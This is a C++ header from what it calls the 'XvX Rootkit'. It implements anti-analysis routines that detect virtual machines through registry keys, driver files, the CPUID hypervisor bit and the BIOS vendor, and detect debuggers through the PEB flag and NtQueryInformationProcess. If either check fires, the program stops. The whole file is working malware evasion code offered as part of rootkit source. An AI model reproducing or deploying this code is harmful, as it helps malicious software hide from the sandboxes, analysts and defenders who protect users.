/*
 * XvX Rootkit - Anti-Analysis Header
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * Debugger detection, VM detection, and sandbox evasion techniques.
 */

#ifndef ANTIANALYSIS_H
#define ANTIANALYSIS_H

#include <windows.h>
#include <winternl.h>
#include <string>
#include <intrin.h>

inline BOOL isRunningInVM()
{
    BOOL isVM = FALSE;

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\vmci", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return TRUE;
    }

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return TRUE;
    }

    if (GetFileAttributesW(L"C:\\Windows\\System32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES)
    {
        return TRUE;
    }

    if (GetFileAttributesW(L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys") != INVALID_FILE_ATTRIBUTES)
    {
        return TRUE;
    }

    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if ((cpuInfo[2] >> 31) & 1)
    {
        return TRUE;
    }

    HKEY hKeyBIOS;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKeyBIOS) == ERROR_SUCCESS)
    {
        WCHAR biosVendor[256];
        DWORD size = sizeof(biosVendor);
        if (RegQueryValueExW(hKeyBIOS, L"SystemManufacturer", NULL, NULL, (LPBYTE)biosVendor, &size) == ERROR_SUCCESS)
        {
            std::wstring vendor(biosVendor);
            if (vendor.find(L"VMware") != std::wstring::npos ||
                vendor.find(L"VirtualBox") != std::wstring::npos ||
                vendor.find(L"QEMU") != std::wstring::npos)
            {
                RegCloseKey(hKeyBIOS);
                return TRUE;
            }
        }
        RegCloseKey(hKeyBIOS);
    }

    return FALSE;
}

inline BOOL isDebuggerPresent_Check()
{
    if (IsDebuggerPresent())
    {
        return TRUE;
    }

    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged)
    {
        return TRUE;
    }

    typedef NTSTATUS(WINAPI * NtQueryInformationProcess_t)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll)
    {
        NtQueryInformationProcess_t pNtQueryInformationProcess =
            (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");

        if (pNtQueryInformationProcess)
        {
            DWORD_PTR debugPort = 0;
            NTSTATUS status = pNtQueryInformationProcess(
                GetCurrentProcess(),
                ProcessDebugPort, // 7
                &debugPort,
                sizeof(debugPort),
                NULL);

            if (status == 0 && debugPort != 0)
            {
                return TRUE;
            }
        }
    }

    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    if (isDebuggerPresent)
    {
        return TRUE;
    }

    return FALSE;
}

inline BOOL isSafeEnvironment()
{
    if (isRunningInVM())
    {
        OutputDebugStringW(L"[AntiAnalysis] VM detected - Stopping");
        return FALSE;
    }

    if (isDebuggerPresent_Check())
    {
        OutputDebugStringW(L"[AntiAnalysis] Debugger detected - Stopping");
        return FALSE;
    }

    return TRUE;
}

#endif // ANTIANALYSIS_H
